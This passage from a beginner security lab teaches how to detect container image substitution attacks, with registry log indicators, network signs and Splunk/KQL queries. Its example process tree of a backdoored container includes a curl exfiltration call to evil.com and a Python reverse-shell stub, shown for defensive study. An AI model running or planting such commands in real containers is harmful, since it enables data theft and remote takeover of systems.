...
<div class="lab-meta">
  ...
  <span>Beginner</span>
  <span>Prerequisites: <a href="0.2-package-managers.md">Lab 0.2</a></span>
</div>
...
!!! danger "Phase 4: DETECT -- Spotting Container Image Tampering"
    ...
    **Goal:** Understand what container image substitution attacks look like in registry logs, runtime telemetry, and your SIEM.
...
- Pushes from unusual IP addresses, service accounts, or outside CI/CD pipelines
- Pushes at unusual times (outside deployment windows)
- Tag changes where the digest differs from the previously known digest for that tag

```
# Registry audit log example (Docker Hub / Harbor / Artifactory):
{"action":"push","repository":"webapp","tag":"latest",
 "digest":"sha256:abc123...","actor":"ci-bot","timestamp":"2026-04-04T03:14:00Z"}
```

Compare the digest in each push event against your known-good digest list. If the digest changed without a corresponding approved deployment, investigate immediately.

**Container runtime logs (Docker/containerd/CRI-O):**

- Containers starting with images that have no digest pin (pulled by tag only)
- Image pull events where the pulled digest differs from the last known digest for that tag
- Containers with unexpected endpoints, open ports, or environment variable access

### Network Indicators

- Containers making outbound connections to unexpected destinations (C2, paste sites, crypto pools)
- Unexpected `/debug`, `/admin`, `/shell`, or `/env` endpoints responding on container ports
- DNS queries from containers to domains not in an allowlist
- Data exfiltration via HTTP POST from containers that should only serve GET requests

### EDR / Process Tree Indicators

```
# Normal container process tree:
containerd-shim
  └── python app.py
        └── (no child processes -- just serves HTTP)

# Backdoored container process tree:
containerd-shim
  └── python app.py
        └── python -c "import socket; ..."     # <-- reverse shell / beacon
  └── /bin/sh -c "curl http://evil.com/..."    # <-- data exfiltration
  └── crond                                     # <-- persistence
```

Any process inside a container that was not part of the original `CMD`/`ENTRYPOINT` is suspicious. Containers should run a single process.

### Example SIEM Queries

**Splunk -- Detect tag overwrites in registry logs:**

```spl
index=registry sourcetype=docker_registry action="push"
| stats latest(digest) as current_digest, earliest(digest) as original_digest, count by repository, tag
| where current_digest != original_digest AND count > 1
| table repository, tag, original_digest, current_digest, count
```

**KQL (Microsoft Sentinel) -- Detect containers pulled without digest pinning:**

```kql
ContainerRegistryEvents
| where ActionType == "pull"
| where ImageReference !contains "@sha256:"
| where ImageReference has ":latest" or ImageReference !contains ":"
| project TimeGenerated, ContainerImage=ImageReference, PulledBy, ClusterName
```

**Splunk -- Detect unexpected outbound connections from containers:**

```spl
index=network sourcetype=firewall src_zone="container_network"
| where NOT dest IN ("pypi.org","registry.npmjs.org","dl-cdn.alpinelinux.org")
| where dest_port NOT IN (80, 443, 53)
| stats count by src, dest, dest_port, container_name
```

!!! tip "SOC Relevance"

    When you see an alert like **"Container image digest changed for tag"** or **"Container process spawned unexpected child process"** in your SIEM, this is what happened: someone pushed a new image to your registry using the same tag (e.g., `latest`), replacing the legitimate image with a backdoored one. Every subsequent deployment or pod restart then pulled the attacker's image instead. The backdoored container looks identical from the outside (same homepage, same version string), but contains additional endpoints, reverse shells, or data exfiltration logic. Compare the current image digest against your known-good digest, and inspect the image layers with `docker history` and `docker inspect` to find what was added.
...
!!! example "CI Integration"
    ...
    **What this does:** Scans all Dockerfiles for `FROM` statements that use tags instead of `@sha256:` digest pins. Fails the build if any unpinned base image is found. Also warns on any `:latest` tag usage in Dockerfiles and compose files.
